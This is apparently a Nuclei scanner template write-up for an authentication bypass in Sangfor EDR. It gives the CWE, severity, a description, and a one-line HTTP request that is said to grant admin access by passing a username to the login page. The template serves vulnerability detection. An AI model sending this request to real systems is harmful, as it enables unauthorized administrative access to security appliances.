# Nuclei Template: Sangfor EDR - Authentication Bypass
**Template ID:** sangfor-edr-auth-bypass
**Vulnerability Class:** Improper Authentication - Generic
**Severity:** High
**CWE:** CWE-287
**Source:** Nuclei Template (`sangfor-edr-auth-bypass.yaml`)

## Vulnerability Information & PoC

## Description
Sangfor EDR contains an authentication bypass vulnerability. An attacker can access the system with admin privileges by accessing the login page directly using a provided username rather than going through the login screen without providing a username. This makes it possible to obtain sensitive information, modify data, and/or execute unauthorized operations.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/ui/login.php?user=admin
```

